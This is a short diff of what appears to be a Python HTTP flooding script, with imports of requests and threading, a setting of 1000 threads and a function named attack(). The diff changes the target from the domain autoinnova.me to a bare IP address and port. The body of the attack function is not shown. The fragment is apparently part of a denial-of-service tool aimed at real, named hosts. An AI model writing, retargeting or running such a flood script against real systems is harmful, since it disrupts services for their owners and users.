@@ -1,7 +1,7 @@
 import requests
 import threading
 
-target = "https://autoinnova.me"
+target = "http://64.23.233.33:3000"
 num_threads = 1000
 
 def attack():
